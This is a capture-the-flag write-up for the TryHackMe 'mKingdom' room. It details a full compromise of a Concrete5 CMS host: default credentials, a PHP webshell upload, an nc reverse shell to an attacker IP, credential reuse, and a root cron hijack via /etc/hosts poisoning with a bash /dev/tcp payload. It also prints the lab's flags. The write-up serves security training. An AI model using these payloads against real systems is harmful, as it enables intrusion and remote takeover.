# 👑 mKingdom: Medium

### TryHackMe Writeup

[![Platform](https://img.shields.io/badge/Platform-TryHackMe-red?style=for-the-badge&logo=tryhackme)](https://tryhackme.com/room/mkingdom)
[![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange?style=for-the-badge)](https://tryhackme.com/room/mkingdom)
[![Status](https://img.shields.io/badge/Status-Pwned-blueviolet?style=for-the-badge)](https://tryhackme.com/room/mkingdom)
[![Type](https://img.shields.io/badge/Type-Linux-informational?style=for-the-badge&logo=linux)](https://tryhackme.com/room/mkingdom)

---

## 📋 Overview

| Field | Details |
|---|---|
| **Target** | `mkingdom.thm` |
| **OS** | Ubuntu 14.04 |
| **Attack Surface** | Concrete5 8.5.2 CMS — default credentials, filetype whitelist bypass, PHP webshell |
| **Privesc** | DB config credential leak → `.bashrc` base64 token → root cron HTTP hijack |

mKingdom runs a Concrete5 8.5.2 CMS on a non-standard port, tucked under a nested path. Default admin credentials open the dashboard, and adding `php` to the allowed upload filetypes turns the file manager into a webshell delivery mechanism. Plaintext database credentials in the CMS config pivot to `toad`, a base64-encoded password stashed in `.bashrc` pivots to `mario`, and a root-owned cron job blindly fetching and executing a shell script over HTTP — using a resolvable hostname rather than localhost — is hijacked by serving a malicious replacement from the attacker machine.

---

## 🔍 Enumeration

### Port Scan

```bash
sudo nmap -sC -sV -p- -vv mkingdom -oA tcpscan-mkingdom
sudo nmap -sU -v -oA udpscan-mkingdom mkingdom
```

```
PORT   STATE SERVICE VERSION
85/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-title: 0H N0! PWN3D 4G4IN
```

UDP returned only filtered ports (68, 631, 5353) — nothing actionable. The single TCP hit is Apache on port 85, presenting a troll landing page. The real attack surface is hidden under a subdirectory.

### Directory Bruteforce

```bash
ffuf -u http://mkingdom:85/FUZZ -w ./Web-Content/raft-medium-directories.txt -ic -fc 403
```

```
app     [Status: 301, Size: 304]
```

Following the redirect chain leads to `http://mkingdom:85/app/castle/` — a running Concrete5 8.5.2 installation branded "Elemental", with a login endpoint at `/app/castle/index.php/login`.

---

## 💀 Initial Access — Concrete5 Default Credentials + PHP Webshell

### Default Credentials

```http
POST /app/castle/index.php/login/authenticate/concrete HTTP/1.1
Host: mkingdom:85

uName=admin&uPassword=password
```

```http
HTTP/1.1 302 Found
Location: http://mkingdom:85/app/castle/index.php/login/login_complete
Set-Cookie: ccmAuthUserHash=1%3Aconcrete%3Ab47b01d98b55db170817c7cd52279a0a
```

`admin:password` authenticated successfully. Dashboard access confirmed.

### Filetype Whitelist Bypass

Concrete5 restricts uploadable file extensions. The allowed list is editable from the dashboard:

```
Dashboard → System & Settings → Files → Allowed File Types
```

The existing whitelist does not include `php`. Adding it and saving turns the file manager into a PHP upload endpoint.

### Webshell Upload

```http
POST /app/castle/index.php/ccm/system/file/upload HTTP/1.1
Host: mkingdom:85
Content-Type: multipart/form-data; boundary=----boundary

------boundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: text/php

<?php echo '<pre>'; system($_GET['cmd']); echo '</pre>'; ?>
------boundary--
```

```json
{"time":"2026-04-22 11:54:11","message":"1 file imported successfully."}
```

### Remote Code Execution

```bash
curl "http://mkingdom:85/app/castle/application/files/3317/7687/3251/shell.php?cmd=id"
```

```
uid=33(www-data) gid=33(www-data) groups=33(www-data),1003(web)
```

### Reverse Shell

```bash
# listener
nc -nlvp 4444

# payload delivered via ?cmd=
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.240.231 4444 >/tmp/f
```

```
connect to [192.168.240.231] from (UNKNOWN) [10.48.173.32] 59862
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data),1003(web)
```

### Shell Stabilisation

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# ctrl+z
stty raw -echo; fg
stty rows 52 cols 153
export TERM=xterm
```

---

## 🔁 Privilege Escalation — www-data → toad

### Database Credentials in CMS Config

```bash
cat /var/www/html/app/castle/application/config/database.php
```

```php
return [
    'default-connection' => 'concrete',
    'connections' => [
        'concrete' => [
            'driver'   => 'c5_pdo_mysql',
            'server'   => 'localhost',
            'database' => 'mKingdom',
            'username' => 'toad',
            'password' => 'toadisthebest',
        ],
    ],
];
```

Three shell users have bash: `root`, `mario`, `toad`. The database password reuses as the shell password.

```bash
su - toad
# password: toadisthebest
```

---

## 🔁 Privilege Escalation — toad → mario

### Base64-Encoded Token in .bashrc

```bash
cat ~/.bashrc | tail
```

```bash
export PWD_token='aWthVGVOVEFOdEVTCg=='
```

```bash
echo aWthVGVOVEFOdEVTCg== | base64 -d
# ikaTeNTANtES
```

```bash
su - mario
# password: ikaTeNTANtES
```

---

## 🔁 Privilege Escalation — mario → root

### Cron Job Discovery via pspy

```bash
./pspy64
```

```
CMD: UID=0  PID=4141  | curl mkingdom.thm:85/app/castle/application/counter.sh
CMD: UID=0  PID=4140  | /bin/sh -c curl mkingdom.thm:85/app/castle/application/counter.sh | bash >> /var/log/up.log
```

Root fetches `counter.sh` from `mkingdom.thm:85` — a resolvable hostname, not `localhost` — and pipes the response directly into `bash`. The file itself is not world-writable:

```bash
ls -lah /var/www/html/app/castle/application/counter.sh
# -rw-r--r-- 1 root root 129 Nov 29  2023 /var/www/html/app/castle/application/counter.sh
```

The hostname resolves via `/etc/hosts`. Poisoning it to point `mkingdom.thm` at the attacker machine redirects the cron's fetch to the attacker's HTTP server.

### /etc/hosts Poisoning

```bash
echo "192.168.240.231  mkingdom.thm" >> /etc/hosts
```

### Serve Malicious counter.sh

On the attacker machine, mirror the expected path:

```bash
mkdir -p app/castle/application/
cat > app/castle/application/counter.sh <<'EOF'
#!/bin/bash
bash -i >& /dev/tcp/192.168.240.231/5555 0>&1
EOF

sudo python3 -m http.server 85
```

```bash
# listener
nc -nlvp 5555
```

When the cron fires, root fetches the payload and executes it:

```
bash-4.3# id
uid=0(root) gid=0(root) groups=0(root)
```

### Root Flag

```bash
cp /root/root.txt /tmp && cat /tmp/root.txt
# thm{e8b2f52d88b9930503cc16ef48775df0}
```

---

## 🗺️ Attack Chain

```
[Port 85 — Apache 2.4.7]
    /app/castle/ → Concrete5 8.5.2
          │
          ▼
[Default Credentials]
    admin:password → dashboard access
          │
          ▼
[Filetype Whitelist → Add php]
    File Manager upload → shell.php
          │
          ▼
[RCE as www-data]
    curl shell.php?cmd=id → reverse shell
          │
          ▼
[database.php]
    username=toad / password=toadisthebest → su toad
          │
          ▼
[.bashrc PWD_token]
    base64 decode → ikaTeNTANtES → su mario
          │
          ▼
[pspy — Root Cron Job]
    curl mkingdom.thm:85/counter.sh | bash (UID=0)
          │
          ▼
[/etc/hosts Poisoning]
    mkingdom.thm → 192.168.240.231
    python3 -m http.server 85 → serve malicious counter.sh
          │
          ▼
[Root Shell]
    uid=0(root) → root.txt
```

---

## 📌 Key Takeaways

- Non-standard ports and nested paths hide the real attack surface — bruteforce directories at every level, not just the root
- Concrete5's filetype whitelist is admin-configurable; default credentials on CMS installs remain a high-yield first guess
- CMS config files (`database.php`, `config.php`) almost always hold plaintext credentials — check them immediately post-foothold
- Environment variables in `.bashrc` are a common credential stash; always inspect them on every lateral pivot
- Root cron jobs fetching scripts over HTTP by hostname (not `localhost`) are fully exploitable via `/etc/hosts` if the attacker can write to it — `curl <url> | bash` with no integrity check is unconditional trust in the remote
- Marking a flag file `root:root` doesn't prevent reading once you have root — but it does mean standard user access fails even on world-readable files if parent directory ACLs interfere

---

## 🎯 MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|---|---|---|
| Initial Access | Exploit Public-Facing Application | [T1190](https://attack.mitre.org/techniques/T1190) |
| Execution | Command and Scripting Interpreter: Unix Shell | [T1059.004](https://attack.mitre.org/techniques/T1059/004) |
| Persistence | Server Software Component: Web Shell | [T1505.003](https://attack.mitre.org/techniques/T1505/003) |
| Credential Access | Unsecured Credentials: Credentials In Files | [T1552.001](https://attack.mitre.org/techniques/T1552/001) |
| Privilege Escalation | Scheduled Task/Job: Cron | [T1053.003](https://attack.mitre.org/techniques/T1053/003) |
| Defense Evasion | Modify Authentication Process | [T1556](https://attack.mitre.org/techniques/T1556) |
| Command and Control | Application Layer Protocol: Web Protocols | [T1071.001](https://attack.mitre.org/techniques/T1071/001) |

---

## 🛠️ Tools Used

| Tool | Purpose |
| --- | --- |
| `nmap` | TCP and UDP port and service enumeration |
| `ffuf` | Directory bruteforce to discover `/app/castle/` |
| `curl` | Webshell verification and RCE testing |
| `nc` | Reverse shell listener |
| `python3 -m http.server` | Serve malicious `counter.sh` to intercept root cron job |
| `pspy` | Unprivileged process monitoring to discover root cron job |
| `base64` | Decode `.bashrc` `PWD_token` credential |

---

## 🚩 Flags

<details>
<summary><code>user.txt</code></summary>

`thm{030a769febb1b3291da1375234b84283}`

</details>

<details>
<summary><code>root.txt</code></summary>

`thm{e8b2f52d88b9930503cc16ef48775df0}`

</details>
